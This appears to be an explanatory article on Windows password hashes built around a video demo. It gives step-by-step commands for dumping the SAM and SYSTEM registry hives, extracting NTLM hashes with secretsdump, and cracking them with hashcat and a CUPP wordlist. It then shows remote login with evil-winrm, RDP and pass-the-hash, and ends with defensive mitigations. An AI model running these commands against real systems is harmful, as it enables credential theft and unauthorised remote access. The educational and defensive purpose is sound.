Introduction

  • an attacker copies a few files,

  • and suddenly gains remote access.

But underneath the theatrics are very real Windows authentication concepts.

Password hashes should be treated as credentials themselves.

How Windows Stores Passwords

Windows stores local account hashes inside the Security Account Manager. 

HKEY_LOCAL_MACHINE\SAM
HKEY_LOCAL_MACHINE\SYSTEM

How Windows Stores Passwords

Windows does not store passwords in plain text.

Instead, passwords are transformed into hashes using cryptographic algorithms. 

Password:
MyPassword123

NTLM Hash:
58A478135A93AC3BF058A5EA0E8FDB71

A hash is:

  • deterministic,
  • fixed-length,
  • one-way,
  • and highly sensitive to changes.

Windows historically relies heavily on:

  • NTLM
  • NTLMv2
  • Kerberos

What Is the SAM Database?

Windows stores local account credentials inside: 

HKEY_LOCAL_MACHINE\SAM

Additional cryptographic information exists in: 

HKEY_LOCAL_MACHINE\SYSTEM

Both are required to extract usable NTLM hashes.

Step 1 — Exporting Registry Hives

The attacker exports the registry hives using administrator privileges: 

reg save hklm\sam sam.save
reg save hklm\system system.save
File Purpose
sam.save Contains account hashes
system.save Contains decryption keys

Step 2 — Moving Files to Kali Linux

The exported registry hives are copied to a Kali Linux machine.

Kali Linux includes offensive security tooling such as:

  • Impacket
  • Hashcat
  • Evil-WinRM
  • John the Ripper
  • CrackMapExec

Step 3 — Extracting NTLM Hashes

The video uses Impacket's SecretsDump utility. 

impacket-secretsdump \
-sam sam.save \
-system system.save \
LOCAL

This tool:

  • reads the SAM hive,
  • uses SYSTEM boot keys,
  • decrypts stored credentials,
  • and outputs NTLM hashes.
Administrator:500:aad3b435b51404eeaad3b435b51404ee:
58A478135A93AC3BF058A5EA0E8FDB71:::

Understanding Password Cracking

Hashes are not decrypted directly.

Instead:

  • attackers guess passwords,
  • generate hashes from guesses,
  • and compare them against the target hash.

If the hashes match: 

Password Found

Dictionary Attacks

The most common cracking method is the dictionary attack.

Instead of brute forcing every possible combination: 

aaaa
AAAB
ZZZZ

attackers use:

  • leaked passwords,
  • human naming patterns,
  • birthdays,
  • pets,
  • seasons,
  • favorite words.

Step 4 — Generating a Wordlist with CUPP

cupp -i

CUPP stands for: 

Common User Passwords Profiler

It generates custom password dictionaries using personal information. 

Michael2024
Amanda123!
Beatles2025

Step 5 — Cracking NTLM Hashes with Hashcat

hashcat -m 1000 hashes.txt wordlist.txt
Parameter Meaning
-m 1000 NTLM mode
hashes.txt Target hashes
wordlist.txt Password dictionary 
Status...........: Cracked

Step 6 — Remote Access with Evil-WinRM

evil-winrm -i 192.168.1.50 -u michael -p Password123

This provides:

  • remote PowerShell access,
  • command execution,
  • file transfer,
  • administrative control.

Step 7 — RDP Access

xfreerdp /v:192.168.1.50 /u:michael /p:Password123

Remote Desktop Protocol provides full graphical access to the target system.

Pass-the-Hash Attacks

One of the most important concepts demonstrated is Pass-the-Hash.

Normally authentication requires: 

username + password

But NTLM sometimes allows authentication using the hash itself. 

evil-winrm -i 192.168.1.50 -u michael -H HASH

Notice:

  • -H instead of -p
  • no plaintext password required

This is extremely dangerous in enterprise environments.

Defensive Mitigations

  • Lock your computer
  • Use strong passwords
  • Use password managers
  • Enable Credential Guard
  • Restrict administrative access
  • Monitor registry hive exports
  • Reduce NTLM usage

Important Reality Check

The video simplifies several steps.

Modern Windows systems include protections such as:

  • Credential Guard
  • UAC
  • Defender detections
  • Firewall restrictions
  • Restricted admin mode

Real enterprise systems are significantly harder targets.

However:

Misconfigurations and weak operational security still make these attacks common.
